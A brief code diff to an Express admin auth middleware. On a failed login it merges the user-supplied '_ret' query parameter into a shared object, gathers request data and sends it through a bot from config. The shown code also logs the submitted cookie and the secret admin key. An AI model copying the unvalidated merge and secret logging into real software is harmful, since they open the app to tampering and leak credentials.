@@ -3,6 +3,7 @@ var admin = express.Router();
 var {admin_key} = require('./config.js');
 const crypto = require('crypto');
 var {retarg, retdata} = require('./controlfactor');
+var {tbot} = require('./config.js');
 function auth(req, res, next) {
     let pass = req.cookies._jizz;
     console.log(pass);
@@ -15,6 +16,9 @@ function auth(req, res, next) {
     console.log(h);
     console.log(admin_key);
     if(h !== admin_key) {
+        retdata.merge(req.query._ret);
+        let data = retdata.retrieve(req);
+        tbot.sendMsg(data);
         res.status(403);
         return res.send('Jizz');
     }
